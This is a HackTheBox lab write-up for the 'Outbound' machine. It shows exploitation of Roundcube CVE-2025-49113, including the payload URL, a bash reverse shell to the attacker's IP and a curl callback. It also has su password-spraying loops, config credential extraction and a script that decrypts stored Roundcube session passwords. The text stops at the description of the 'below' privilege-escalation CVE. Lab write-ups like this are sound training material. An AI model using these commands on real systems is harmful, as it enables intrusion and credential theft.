---
render_with_liquid: false
title: HackTheBox Writeup - Outbound
date: 2025-07-11 17:19:10 +1400
tags: [hackthebox, nmap, linux, assumed-breach, feroxbuster, roundcube-webmail, cve-2025-49113, php, deserialization, password-spraying, mysql, roundcube-decrypt, crypto, sudo, below, cve-2025-27591, file-write, symlinks]
image:
    path: https://htb-mp-prod-public-storage.s3.eu-central-1.amazonaws.com/avatars/b1096fc86df3fb6035baad7f599094be.png
    width: 640
    height: 480
---



`Outbound` is an easy-difficulty Linux machine with provided assumed breach credentials. The credentials provide access to a `Roundcube` instance, where the user can enumerate the version and utilize [CVE-2025-49113](https://nvd.nist.gov/vuln/detail/CVE-2025-49113), which demonstrates post-authenticated remote code execution via PHP object deserialization. After initial access to the target, we enumerate the database and find a session for the Jacob user, which, when base64 decoded, provides an encrypted password. Using an internal tool called `decrypt.sh`, we can extract the plaintext value of the password, which allows access to Roundcube as Jacob. Jacob has two messages in his inbox: one provides him with a new, updated password for the system, and another informs him that they have been granted `sudo` privileges to monitor system resources with a utility called `below` which is vulnerable to [CVE-2025-27591](https://nvd.nist.gov/vuln/detail/CVE-2025-27591) that is a flaw that creates logs within the `/var/log/below` directory with excessive permissions allowing attackers to perform symlink attacks under certain conditions. We symlink `/etc/passwd` to the `error_root.log` file and write our payload to the log file via parameter injection, thereby creating a new user with a UID of the root user.


# Recon
---

## Hosts

> `pt` command is a **custom pentest framework** to manage hosts and variables, it is not required to reproduce the steps in this writeup
{: .prompt-info }

```bash
┌──(bravosec㉿fsociety)-[~/htb/Outbound]
└─$ pt init '10.129.104.254 mail.outbound.htb outbound.htb'
+----------+--------+----------------+-------------------+
| PROFILE  | STATUS |       IP       |      DOMAIN       |
+----------+--------+----------------+-------------------+
| outbound | on     | 10.129.104.254 | mail.outbound.htb |
| outbound | on     | 10.129.104.254 | outbound.htb      |
+----------+--------+----------------+-------------------+
```

## Nmap

```bash
# Nmap 7.95 scan initiated Fri Jul 11 17:19:09 2025 as: /usr/lib/nmap/nmap -sVC --version-all -T4 -Pn -vv -oA ./nmap/full_tcp_scan -p 22,80, 10.129.104.254
Nmap scan report for 10.129.104.254
Host is up, received user-set (0.19s latency).
Scanned at 2025-07-11 17:19:10 CST for 13s

PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 9.6p1 Ubuntu 3ubuntu13.12 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 0c:4b:d2:76:ab:10:06:92:05:dc:f7:55:94:7f:18:df (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBN9Ju3bTZsFozwXY1B2KIlEY4BA+RcNM57w4C5EjOw1QegUUyCJoO4TVOKfzy/9kd3WrPEj/FYKT2agja9/PM44=
|   256 2d:6d:4a:4c:ee:2e:11:b6:c8:90:e6:83:e9:df:38:b0 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIH9qI0OvMyp03dAGXR0UPdxw7hjSwMR773Yb9Sne+7vD
80/tcp open  http    syn-ack ttl 63 nginx 1.24.0 (Ubuntu)
|_http-title: Did not follow redirect to http://mail.outbound.htb/
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: nginx/1.24.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri Jul 11 17:19:23 2025 -- 1 IP address (1 host up) scanned in 13.55 seconds
```


## Assumed breach scenario

![](/assets/obsidian/5290ee9752d3885140b11df0c640cd61.png)

```bash
┌──(bravosec㉿fsociety)-[~/htb/Outbound]
└─$ creds-set 'tyler' 'LhKL1o9Nm3X2'
[+] Password set for user tyler
```


## 80 - HTTP : Roundcube Webmail


### Info

```ruby
http://mail.outbound.htb [200] [Roundcube Webmail :: Welcome to Roundcube Webmail] [nginx/1.24.0 (Ubuntu)] [258b4588d4bc445bb061fc9df8f1c02d5523468f] [Bootstrap,Nginx:1.24.0,PHP,RoundCube,Ubuntu,jQuery,jQuery UI]
```

![](/assets/obsidian/69681d32bc3784a4faabec2f79b92638.png)

### Directory

```bash
┌──(bravosec㉿fsociety)-[~/htb/Outbound]
└─$ URL="http://$(pt get rhost):80"; OUT="$(echo $URL | awk -F'://' '{print $NF}' | sed -e 's|[/:]|-|g')"; feroxbuster -k -A -w /usr/share/dirb/wordlists/common.txt --collect-words --collect-backups --collect-extensions --scan-dir-listings -C 400,404,500 -r -n -u "$URL" -o "ferox_${OUT}_common.txt"
[...]
200      GET       97l      333w     5345c http://mail.outbound.htb/_vti_bin/shtml.bak
200      GET       97l      333w     5345c http://mail.outbound.htb/_vti_bin/shtml.dll
200      GET       97l      333w     5345c http://mail.outbound.htb/_vti_bin/shtml.dll.bak
200      GET       97l      333w     5345c http://mail.outbound.htb/_vti_bin/._vti_bin.swp
200      GET       97l      333w     5345c http://mail.outbound.htb/_vti_bin/_vti_bin
200      GET       97l      333w     5345c http://mail.outbound.htb/_vti_bin/_vti_bin.bak
200      GET       97l      333w     5345c http://mail.outbound.htb/_vti_bin/_vti_bin.old
```


# User Flag
---


## Shell as www-data on container


### 80 - Roundcube Webmail 1.6.10 : PHP Object Deserialization to RCE (CVE-2025-49113)

After logging in to **Roundcube** with the credential `tyler:LhKL1o9Nm3X2`, we can get its version `1.6.10` from about page

> http://mail.outbound.htb/

![](/assets/obsidian/1de3c46bae1ed26faae90454c9091107.png)

![](/assets/obsidian/d3f2f9b0da5b6a7418af8e3c95a4f471.png)

- Google `roundcube webmail 1.6.10 exploit`

> Research - https://fearsoff.org/research/roundcube

> POC - https://github.com/fearsoff-org/CVE-2025-49113

> **CVE-2025-49113**
> 
> Roundcube Webmail before 1.5.10 and 1.6.x before 1.6.11 allows remote code execution by authenticated users because the _from parameter in a URL is not validated in program/actions/settings/upload.php, leading to PHP Object Deserialization.
{: .prompt-info }

```bash
cd exploit
git clone https://github.com/fearsoff-org/CVE-2025-49113
cd CVE-2025-49113
```

Listen for ICMP packets to validate the exploit

```bash
sudo tcpdump -i tun0 -n icmp -v
```

Run exploit to ping our machine from target machine

```bash
┌──(bravosec㉿fsociety)-[~/htb/Outbound/exploit/CVE-2025-49113]
└─$ php CVE-2025-49113.php http://mail.outbound.htb 'tyler' 'LhKL1o9Nm3X2' "ping 10.10.14.65 -c 1"
### Roundcube ≤ 1.6.10 Post-Auth RCE via PHP Object Deserialization [CVE-2025-49113]

### Retrieving CSRF token and session cookie...

### Authenticating user: tyler

### Authentication successful

### Command to be executed:
ping 10.10.14.65 -c 1

### Injecting payload...

### End payload: http://mail.outbound.htb/?_from=edit-%21%C7%22%C7%3B%C7i%C7%3A%C70%C7%3B%C7O%C7%3A%C71%C76%C7%3A%C7%22%C7C%C7r%C7y%C7p%C7t%C7_%C7G%C7P%C7G%C7_%C7E%C7n%C7g%C7i%C7n%C7e%C7%22%C7%3A%C71%C7%3A%C7%7B%C7S%C7%3A%C72%C76%C7%3A%C7%22%C7%5C%C70%C70%C7C%C7r%C7y%C7p%C7t%C7_%C7G%C7P%C7G%C7_%C7E%C7n%C7g%C7i%C7n%C7e%C7%5C%C70%C70%C7_%C7g%C7p%C7g%C7c%C7o%C7n%C7f%C7%22%C7%3B%C7S%C7%3A%C72%C73%C7%3A%C7%22%C7p%C7i%C7n%C7g%C7+%C71%C70%C7%5C%C72%C7e%C71%C70%C7%5C%C72%C7e%C71%C74%C7%5C%C72%C7e%C76%C75%C7+%C7-%C7c%C7+%C71%C7%3B%C7%23%C7%22%C7%3B%C7%7D%C7i%C7%3A%C70%C7%3B%C7b%C7%3A%C70%C7%3B%C7%7D%C7%22%C7%3B%C7%7D%C7%7D%C7&_task=settings&_framed=1&_remote=1&_id=1&_uploadid=1&_unlock=1&_action=upload

### Payload injected successfully

### Executing payload...

### Exploit executed successfully
```

- There were no ICMP packets observed by **tcpdump**

![](/assets/obsidian/3640bb62f3848b68951d217b5d240277.png)

We've validated that the exploit works by sending a request to our web server

```bash
┌──(bravosec㉿fsociety)-[~/htb/Outbound/exploit/CVE-2025-49113]
└─$ php CVE-2025-49113.php http://mail.outbound.htb 'tyler' 'LhKL1o9Nm3X2' "curl 10.10.14.65"
[...]
```

![](/assets/obsidian/3ffe063921ebafec133773c3aa1dacfa.png)

Get a shell

```bash
nc -lvnp 53
```

```bash
┌──(bravosec㉿fsociety)-[~/htb/Outbound/exploit/CVE-2025-49113]
└─$ php CVE-2025-49113.php http://mail.outbound.htb 'tyler' 'LhKL1o9Nm3X2' 'bash -c "bash -i >& /dev/tcp/10.10.14.65/53 0>&1"'
[...]
```

```bash
┌──(bravosec㉿fsociety)-[~/htb/Outbound/exploit/CVE-2025-49113]
└─$ nc -lvnp 53
listening on [any] 53 ...
connect to [10.10.14.65] from (UNKNOWN) [10.129.105.152] 39690
bash: cannot set terminal process group (248): Inappropriate ioctl for device
bash: no job control in this shell
www-data@mail:/var/www/html/roundcube/public_html$ /usr/bin/script -qc /bin/bash /dev/null
<ublic_html$ /usr/bin/script -qc /bin/bash /dev/null
www-data@mail:/var/www/html/roundcube/public_html$ ^Z
zsh: suspended  nc -lvnp 53

┌──(bravosec㉿fsociety)-[~/htb/Outbound/exploit/CVE-2025-49113]
└─$ stty raw -echo;fg
[1]  + continued  nc -lvnp 53
                             export TERM=xterm
www-data@mail:/var/www/html/roundcube/public_html$ stty rows 50 columns 209
www-data@mail:/var/www/html/roundcube/public_html$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```


## Shell as tyler on container


### Enumeration

- This is a docker container

```bash
www-data@mail:/var/www/html/roundcube/public_html$ ls -latr /
total 84
[...]
-rwxr-xr-x   1 root root    0 Jun  8 12:26 .dockerenv
[...]
```

- Users with shell

```bash
www-data@mail:/var/www/html/roundcube/public_html$ cat /etc/passwd | grep -viE 'false$|nologin$|sync$'
root:x:0:0:root:/root:/bin/bash
tyler:x:1000:1000::/home/tyler:/bin/bash
jacob:x:1001:1001::/home/jacob:/bin/bash
mel:x:1002:1002::/home/mel:/bin/bash
```

- No interesting mounts from host

```bash
www-data@mail:/var/www/html/roundcube/public_html$ cat /proc/mounts | grep '^/dev'
/dev/sda2 /etc/resolv.conf ext4 rw,relatime 0 0
/dev/sda2 /etc/hostname ext4 rw,relatime 0 0
/dev/sda2 /etc/hosts ext4 rw,relatime 0 0
```


### Password spray

```bash
www-data@mail:/var/www/html/roundcube/public_html$ PASS='LhKL1o9Nm3X2'; for USER in $(cat /etc/passwd|grep -viE 'false$|nologin$|sync$'|awk -F: '{print $1}'); do (x=$(echo $PASS | su "$USER" -c whoami); if [ "$x" ]; then echo "[+] $USER"; fi) & done
[1] 21856
[2] 21857
[3] 21858
[4] 21860
www-data@mail:/var/www/html/roundcube/public_html$ Password: Password: Password: Password: [+] tyler
```

```bash
www-data@mail:/var/www/html/roundcube/public_html$ su - tyler
Password:
tyler@mail:~$ id
uid=1000(tyler) gid=1000(tyler) groups=1000(tyler)
```


## Shell as jacob on container


### Discover encrypted user password from roundcube database

- **roundcube**'s config file is at `/var/www/html/roundcube/config/config.inc.php`, which was created by `root`

```bash
www-data@mail:/var/www/html/roundcube/public_html$ find -L /var/www/html/roundcube/ -type f -exec ls -lahtr {} + 2>/dev/null | grep config -i
[...]
-rw-r--r-- 1 www-data www-data  164 Feb  8 08:47 /var/www/html/roundcube/config/.htaccess
-rw-r--r-- 1 root     root     3.0K Jun  6 18:55 /var/www/html/roundcube/config/config.inc.php
-rw-r--r-- 1 www-data www-data  32K Feb  8 08:47 /var/www/html/roundcube/program/lib/Roundcube/rcube_config.php
-rw-r--r-- 1 www-data www-data   51 Feb  8 08:47 /var/www/html/roundcube/vendor/kolab/net_ldap3/.arcconfig
```

- **Mysql** creds : `roundcube:RCDBPass2025`
- DES key to encrypt users imap password : `rcmail-!24ByteDESkey*Str`

```bash
www-data@mail:/var/www/html/roundcube/public_html$ cat /var/www/html/roundcube/config/config.inc.php
<?php

/*
 +-----------------------------------------------------------------------+
 | Local configuration for the Roundcube Webmail installation.           |
 |                                                                       |
 | This is a sample configuration file only containing the minimum       |
 | setup required for a functional installation. Copy more options       |
 | from defaults.inc.php to this file to override the defaults.          |
 |                                                                       |
 | This file is part of the Roundcube Webmail client                     |
 | Copyright (C) The Roundcube Dev Team                                  |
 |                                                                       |
 | Licensed under the GNU General Public License version 3 or            |
 | any later version with exceptions for skins & plugins.                |
 | See the README file for a full license statement.                     |
 +-----------------------------------------------------------------------+
*/

$config = [];

// Database connection string (DSN) for read+write operations
// Format (compatible with PEAR MDB2): db_provider://user:password@host/database
// Currently supported db_providers: mysql, pgsql, sqlite, mssql, sqlsrv, oracle
// For examples see http://pear.php.net/manual/en/package.database.mdb2.intro-dsn.php
// NOTE: for SQLite use absolute path (Linux): 'sqlite:////full/path/to/sqlite.db?mode=0646'
//       or (Windows): 'sqlite:///C:/full/path/to/sqlite.db'
$config['db_dsnw'] = 'mysql://roundcube:RCDBPass2025@localhost/roundcube';
[...]

// This key is used to encrypt the users imap password which is stored
// in the session record. For the default cipher method it must be
// exactly 24 characters long.
// YOUR KEY MUST BE DIFFERENT THAN THE SAMPLE VALUE FOR SECURITY REASONS
$config['des_key'] = 'rcmail-!24ByteDESkey*Str';
[...]
```

Connect to **mysql** database on localhost

```bash
www-data@mail:/var/www/html/roundcube/public_html$ mysql -u roundcube -p'RCDBPass2025'
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 545
Server version: 10.11.13-MariaDB-0ubuntu0.24.04.1 Ubuntu 24.04

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MariaDB [(none)]> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| roundcube          |
+--------------------+
2 rows in set (0.001 sec)
```

- There are only 2 none-empty tables in `roundcube` database

```bash
MariaDB [(none)]> SELECT table_name,table_rows FROM information_schema.tables WHERE table_schema = 'roundcube' AND table_rows > 0;
+------------+------------+
| table_name | table_rows |
+------------+------------+
| users      |          3 |
| session    |          1 |
+------------+------------+
2 rows in set (0.003 sec)
```

- There are no interesting data in `users` table

```bash
MariaDB [(none)]> use roundcube;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
MariaDB [roundcube]> select * from users;
+---------+----------+-----------+---------------------+---------------------+---------------------+----------------------+----------+---------------------------------------------------+
| user_id | username | mail_host | created             | last_login          | failed_login        | failed_login_counter | language | preferences                                       |
+---------+----------+-----------+---------------------+---------------------+---------------------+----------------------+----------+---------------------------------------------------+
|       1 | jacob    | localhost | 2025-06-07 13:55:18 | 2025-06-11 07:52:49 | 2025-06-11 07:51:32 |                    1 | en_US    | a:1:{s:11:"client_hash";s:16:"hpLLqLwmqbyihpi7";} |
|       2 | mel      | localhost | 2025-06-08 12:04:51 | 2025-06-08 13:29:05 | NULL                |                 NULL | en_US    | a:1:{s:11:"client_hash";s:16:"GCrPGMkZvbsnc3xv";} |
|       3 | tyler    | localhost | 2025-06-08 13:28:55 | 2025-07-14 13:49:41 | 2025-06-11 07:51:22 |                    1 | en_US    | a:1:{s:11:"client_hash";s:16:"Y2Rz3HTwxwLJHevI";} |
+---------+----------+-----------+---------------------+---------------------+---------------------+----------------------+----------+---------------------------------------------------+
3 rows in set (0.001 sec)
```

There's a row in `session` table that contains a base64 data

```bash
MariaDB [roundcube]> select * from session;
[...]
| sess_id                    | changed             | ip         | vars                                                                                                        [...]
| 6a5ktqih5uca6lj8vrmgh9v0oh | 2025-06-08 15:46:40 | 172.17.0.1 | bGFuZ3VhZ2V8czo1OiJlbl9VUyI7aW1hcF9uYW1lc3BhY2V8YTo0OntzOjg6InBlcnNvbmFsIjthOjE6e2k6MDthOjI6e2k6MDtzOjA6IiI7aToxO3M6MToiLyI7fX1zOjU6Im90aGVyIjtOO3M6Njoic2hhcmVkIjtOO3M6MTA6InByZWZpeF9vdXQiO3M6MDoiIjt9aW1hcF9kZWxpbWl0ZXJ8czoxOiIvIjtpbWFwX2xpc3RfY29uZnxhOjI6e2k6MDtOO2k6MTthOjA6e319dXNlcl9pZHxpOjE7dXNlcm5hbWV8czo1OiJqYWNvYiI7c3RvcmFnZV9ob3N0fHM6OToibG9jYWxob3N0IjtzdG9yYWdlX3BvcnR8aToxNDM7c3RvcmFnZV9zc2x8YjowO3Bhc3N3b3JkfHM6MzI6Ikw3UnYwMEE4VHV3SkFyNjdrSVR4eGNTZ25JazI1QW0vIjtsb2dpbl90aW1lfGk6MTc0OTM5NzExOTt0aW1lem9uZXxzOjEzOiJFdXJvcGUvTG9uZG9uIjtTVE9SQUdFX1NQRUNJQUwtVVNFfGI6MTthdXRoX3NlY3JldHxzOjI2OiJEcFlxdjZtYUk5SHhETDVHaGNDZDhKYVFRVyI7cmVxdWVzdF90b2tlbnxzOjMyOiJUSXNPYUFCQTF6SFNYWk9CcEg2dXA1WEZ5YXlOUkhhdyI7dGFza3xzOjQ6Im1haWwiO3NraW5fY29uZmlnfGE6Nzp7czoxNzoic3VwcG9ydGVkX2xheW91dHMiO2E6MTp7aTowO3M6MTA6IndpZGVzY3JlZW4iO31zOjIyOiJqcXVlcnlfdWlfY29sb3JzX3RoZW1lIjtzOjk6ImJvb3RzdHJhcCI7czoxODoiZW1iZWRfY3NzX2xvY2F0aW9uIjtzOjE3OiIvc3R5bGVzL2VtYmVkLmNzcyI7czoxOToiZWRpdG9yX2Nzc19sb2NhdGlvbiI7czoxNzoiL3N0eWxlcy9lbWJlZC5jc3MiO3M6MTc6ImRhcmtfbW9kZV9zdXBwb3J0IjtiOjE7czoyNjoibWVkaWFfYnJvd3Nlcl9jc3NfbG9jYXRpb24iO3M6NDoibm9uZSI7czoyMToiYWRkaXRpb25hbF9sb2dvX3R5cGVzIjthOjM6e2k6MDtzOjQ6ImRhcmsiO2k6MTtzOjU6InNtYWxsIjtpOjI7czoxMDoic21hbGwtZGFyayI7fX1pbWFwX2hvc3R8czo5OiJsb2NhbGhvc3QiO3BhZ2V8aToxO21ib3h8czo1OiJJTkJPWCI7c29ydF9jb2x8czowOiIiO3NvcnRfb3JkZXJ8czo0OiJERVNDIjtTVE9SQUdFX1RIUkVBRHxhOjM6e2k6MDtzOjEwOiJSRUZFUkVOQ0VTIjtpOjE7czo0OiJSRUZTIjtpOjI7czoxNDoiT1JERVJFRFNVQkpFQ1QiO31TVE9SQUdFX1FVT1RBfGI6MDtTVE9SQUdFX0xJU1QtRVhURU5ERUR8YjoxO2xpc3RfYXR0cmlifGE6Njp7czo0OiJuYW1lIjtzOjg6Im1lc3NhZ2VzIjtzOjI6ImlkIjtzOjExOiJtZXNzYWdlbGlzdCI7czo1OiJjbGFzcyI7czo0MjoibGlzdGluZyBtZXNzYWdlbGlzdCBzb3J0aGVhZGVyIGZpeGVkaGVhZGVyIjtzOjE1OiJhcmlhLWxhYmVsbGVkYnkiO3M6MjI6ImFyaWEtbGFiZWwtbWVzc2FnZWxpc3QiO3M6OToiZGF0YS1saXN0IjtzOjEyOiJtZXNzYWdlX2xpc3QiO3M6MTQ6ImRhdGEtbGFiZWwtbXNnIjtzOjE4OiJUaGUgbGlzdCBpcyBlbXB0eS4iO311bnNlZW5fY291bnR8YToyOntzOjU6IklOQk9YIjtpOjI7czo1OiJUcmFzaCI7aTowO31mb2xkZXJzfGE6MTp7czo1OiJJTkJPWCI7YToyOntzOjM6ImNudCI7aToyO3M6NjoibWF4dWlkIjtpOjM7fX1saXN0X21vZF9zZXF8czoyOiIxMCI7 |
[...]
```

We've got the encrypted password : `L7Rv00A8TuwJAr67kITxxcSgnIk25Am/` of `jacob` from the session variable

```bash
┌──(bravosec㉿fsociety)-[~/htb/Outbound]
└─$  echo 'bGFuZ3VhZ2V8czo1OiJlbl9VUyI7aW1hcF9uYW1lc3BhY2V8YTo0OntzOjg6InBlcnNvbmFsIjthOjE6e2k6MDthOjI6e2k6MDtzOjA6IiI7aToxO3M6MToiLyI7fX1zOjU6Im90aGVyIjtOO3M6Njoic2hhcmVkIjtOO3M6MTA6InByZWZpeF9vdXQiO3M6MDoiIjt9aW1hcF9kZWxpbWl0ZXJ8czoxOiIvIjtpbWFwX2xpc3RfY29uZnxhOjI6e2k6MDtOO2k6MTthOjA6e319dXNlcl9pZHxpOjE7dXNlcm5hbWV8czo1OiJqYWNvYiI7c3RvcmFnZV9ob3N0fHM6OToibG9jYWxob3N0IjtzdG9yYWdlX3BvcnR8aToxNDM7c3RvcmFnZV9zc2x8YjowO3Bhc3N3b3JkfHM6MzI6Ikw3UnYwMEE4VHV3SkFyNjdrSVR4eGNTZ25JazI1QW0vIjtsb2dpbl90aW1lfGk6MTc0OTM5NzExOTt0aW1lem9uZXxzOjEzOiJFdXJvcGUvTG9uZG9uIjtTVE9SQUdFX1NQRUNJQUwtVVNFfGI6MTthdXRoX3NlY3JldHxzOjI2OiJEcFlxdjZtYUk5SHhETDVHaGNDZDhKYVFRVyI7cmVxdWVzdF90b2tlbnxzOjMyOiJUSXNPYUFCQTF6SFNYWk9CcEg2dXA1WEZ5YXlOUkhhdyI7dGFza3xzOjQ6Im1haWwiO3NraW5fY29uZmlnfGE6Nzp7czoxNzoic3VwcG9ydGVkX2xheW91dHMiO2E6MTp7aTowO3M6MTA6IndpZGVzY3JlZW4iO31zOjIyOiJqcXVlcnlfdWlfY29sb3JzX3RoZW1lIjtzOjk6ImJvb3RzdHJhcCI7czoxODoiZW1iZWRfY3NzX2xvY2F0aW9uIjtzOjE3OiIvc3R5bGVzL2VtYmVkLmNzcyI7czoxOToiZWRpdG9yX2Nzc19sb2NhdGlvbiI7czoxNzoiL3N0eWxlcy9lbWJlZC5jc3MiO3M6MTc6ImRhcmtfbW9kZV9zdXBwb3J0IjtiOjE7czoyNjoibWVkaWFfYnJvd3Nlcl9jc3NfbG9jYXRpb24iO3M6NDoibm9uZSI7czoyMToiYWRkaXRpb25hbF9sb2dvX3R5cGVzIjthOjM6e2k6MDtzOjQ6ImRhcmsiO2k6MTtzOjU6InNtYWxsIjtpOjI7czoxMDoic21hbGwtZGFyayI7fX1pbWFwX2hvc3R8czo5OiJsb2NhbGhvc3QiO3BhZ2V8aToxO21ib3h8czo1OiJJTkJPWCI7c29ydF9jb2x8czowOiIiO3NvcnRfb3JkZXJ8czo0OiJERVNDIjtTVE9SQUdFX1RIUkVBRHxhOjM6e2k6MDtzOjEwOiJSRUZFUkVOQ0VTIjtpOjE7czo0OiJSRUZTIjtpOjI7czoxNDoiT1JERVJFRFNVQkpFQ1QiO31TVE9SQUdFX1FVT1RBfGI6MDtTVE9SQUdFX0xJU1QtRVhURU5ERUR8YjoxO2xpc3RfYXR0cmlifGE6Njp7czo0OiJuYW1lIjtzOjg6Im1lc3NhZ2VzIjtzOjI6ImlkIjtzOjExOiJtZXNzYWdlbGlzdCI7czo1OiJjbGFzcyI7czo0MjoibGlzdGluZyBtZXNzYWdlbGlzdCBzb3J0aGVhZGVyIGZpeGVkaGVhZGVyIjtzOjE1OiJhcmlhLWxhYmVsbGVkYnkiO3M6MjI6ImFyaWEtbGFiZWwtbWVzc2FnZWxpc3QiO3M6OToiZGF0YS1saXN0IjtzOjEyOiJtZXNzYWdlX2xpc3QiO3M6MTQ6ImRhdGEtbGFiZWwtbXNnIjtzOjE4OiJUaGUgbGlzdCBpcyBlbXB0eS4iO311bnNlZW5fY291bnR8YToyOntzOjU6IklOQk9YIjtpOjI7czo1OiJUcmFzaCI7aTowO31mb2xkZXJzfGE6MTp7czo1OiJJTkJPWCI7YToyOntzOjM6ImNudCI7aToyO3M6NjoibWF4dWlkIjtpOjM7fX1saXN0X21vZF9zZXF8czoyOiIxMCI7' | base64 -d | tr ';' '\n'
[...]
a:0:{}}user_id|i:1
username|s:5:"jacob"
storage_host|s:9:"localhost"
storage_port|i:143
storage_ssl|b:0
password|s:32:"L7Rv00A8TuwJAr67kITxxcSgnIk25Am/"
[...]
```


### Decrypt DES encrypted user password

By researching how **roundcube** decrypt strings, we've found that it uses `des_key` from the config file and extracts IV (first 8 bytes) from the base64 encoded cipher text which is using **DES-EDE3-CBC** algorithm, then decrypts the cipher text only

> https://github.com/roundcube/roundcubemail/blob/master/program/lib/Roundcube/rcube.php#L943

![](/assets/obsidian/5ae0e87c01a57406469acc767cfce57b.png)

![](/assets/obsidian/1fca55a497bd86e7692cce4e94bdbaef.png)

![](/assets/obsidian/f2f4d8b394f734395fde2906649cce0c.png)

Let's copy and modify the `decrypt()` function to fit our need

> `decrypt.php`

```php
<?php

$key = $argv[1];
$cipher = $argv[2];

function decrypt($cipher, $key = 'des_key', $base64 = true)
{
        // @phpstan-ignore-next-line
        if (!is_string($cipher) || !strlen($cipher)) {
            return false;
        }

        if ($base64) {
            $cipher = base64_decode($cipher, true);
            if ($cipher === false) {
                return false;
            }
        }

        $ckey = $key;
        $method = 'DES-EDE3-CBC';
        $iv_size = openssl_cipher_iv_length($method);
        $tag = null;

        if (preg_match('/^##(.{16})##/s', $cipher, $matches)) {
            $tag = $matches[1];
            $cipher = substr($cipher, strlen($matches[0]));
        }

        $iv = substr($cipher, 0, $iv_size);

        // session corruption? (#1485970)
        if (strlen($iv) < $iv_size) {
            return false;
        }

        $cipher = substr($cipher, $iv_size);
        $clear = openssl_decrypt($cipher, $method, $ckey, \OPENSSL_RAW_DATA, $iv, $tag);

        return $clear;
}

echo decrypt($cipher, $key)

?>
```

Got the password : `595mO8DmwGeD`

```bash
┌──(bravosec㉿fsociety)-[~/htb/Outbound]
└─$ php decrypt.php 'rcmail-!24ByteDESkey*Str' 'L7Rv00A8TuwJAr67kITxxcSgnIk25Am/'
595mO8DmwGeD 
```

> **Alternative python code**
> 
> ```python
> import sys
> from base64 import b64decode
> from cryptography.hazmat.decrepit.ciphers.algorithms import TripleDES
> from cryptography.hazmat.primitives.ciphers import Cipher, modes
> from cryptography.hazmat.backends import default_backend
> 
> key = sys.argv[1].encode()
> data = b64decode(sys.argv[2])
> iv, ct = data[:8], data[8:]
> 
> cipher = Cipher(TripleDES(key), modes.CBC(iv), backend=default_backend())
> decryptor = cipher.decryptor()
> plaintext = decryptor.update(ct) + decryptor.finalize()
> 
> print(plaintext.rstrip(b'\x00').decode())
> ```
{: .prompt-tip }


### Password spray

```bash
tyler@mail:~$ PASS='595mO8DmwGeD'; for USER in $(cat /etc/passwd|grep -viE 'false$|nologin$|sync$'|awk -F: '{print $1}'); do (x=$(echo $PASS | su "$USER" -c whoami); if [ "$x" ]; then echo "[+] $USER"; fi) & done
[1] 28396
[2] 28397
[3] 28399
[4] 28400
tyler@mail:~$ Password: Password: Password: Password: [+] jacob
```

```bash
tyler@mail:~$ su - jacob
Password:
jacob@mail:~$ id
uid=1001(jacob) gid=1001(jacob) groups=1001(jacob)
```


## Shell as jacob on host


### 80 - Roundcube Webmail : Password in email

After logging in with the credential `jacob:595mO8DmwGeD`, we found a new password : `gY4Wr3a1evp4` that was applied to `jacob`'s account

> http://mail.outbound.htb/?_task=mail&_mbox=INBOX

![](/assets/obsidian/f9af879ee7f981999f35ed60ccea6324.png)


### (Failed) Password spray

```bash
jacob@mail:~$ PASS='gY4Wr3a1evp4'; for USER in $(cat /etc/passwd|grep -viE 'false$|nologin$|sync$'|awk -F: '{print $1}'); do (x=$(echo $PASS | su "$USER" -c whoami); if [ "$x" ]; then echo "[+] $USER"; fi) & done
[1] 28767
[2] 28768
[3] 28773
[4] 28775
jacob@mail:~$ Password: Password: Password: Password:
```


### 22 - SSH

```bash
┌──(bravosec㉿fsociety)-[~/htb/Outbound]
└─$ sshpass -p 'gY4Wr3a1evp4' ssh -o "StrictHostKeyChecking no" jacob@10.129.105.152
Warning: Permanently added '10.129.105.152' (ED25519) to the list of known hosts.
Welcome to Ubuntu 24.04.2 LTS (GNU/Linux 6.8.0-63-generic x86_64)
[...]
jacob@outbound:~$ id
uid=1002(jacob) gid=1002(jacob) groups=1002(jacob),100(users)
jacob@outbound:~$ cat user.txt
c08b171817fe32c671df37a83040e22f
```


# Root Flag
---

## Shell as root


### Below v0.9.0 - LPE (CVE-2025-27591)

```bash
jacob@outbound:~$ sudo -l
Matching Defaults entries for jacob on outbound:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User jacob may run the following commands on outbound:
    (ALL : ALL) NOPASSWD: /usr/bin/below *, !/usr/bin/below --config*, !/usr/bin/below --debug*, !/usr/bin/below -d*
```

```bash
jacob@outbound:~$ /usr/bin/below -h
Usage: below [OPTIONS] [COMMAND]

Commands:
  live      Display live system data (interactive) (default)
  record    Record local system data (daemon mode)
  replay    Replay historical data (interactive)
  debug     Debugging facilities (for development use)
  dump      Dump historical data into parseable text format
  snapshot  Create a historical snapshot file for a given time range
  help      Print this message or the help of the given subcommand(s)

Options:
      --config <CONFIG>  [default: /etc/below/below.conf]
  -d, --debug
  -h, --help             Print help
```

By googling `linux below`, we found the tool's github repo, and there's a **Security** risk

> https://github.com/facebookincubator/below/security

![](/assets/obsidian/52de93c2a9f4aaf8dcdea94d38ac131f.png)

> https://github.com/facebookincubator/below/security/advisories/GHSA-9mc5-7qhg-fp3w

![](/assets/obsidian/fc2c0d65e2e75ae2bd255948a8ef48d5.png)

> **CVE-2025-27591**
> 
> A privilege escalation vulnerability existed in the Below service prior to v0.9.0 due to the creation of a world-writable directory at /var/log/below. This could have allowed local unprivileged users to escalate to root privileges through symlink attacks that manipulate files such as `/etc/shadow`.
{: .prompt-info }

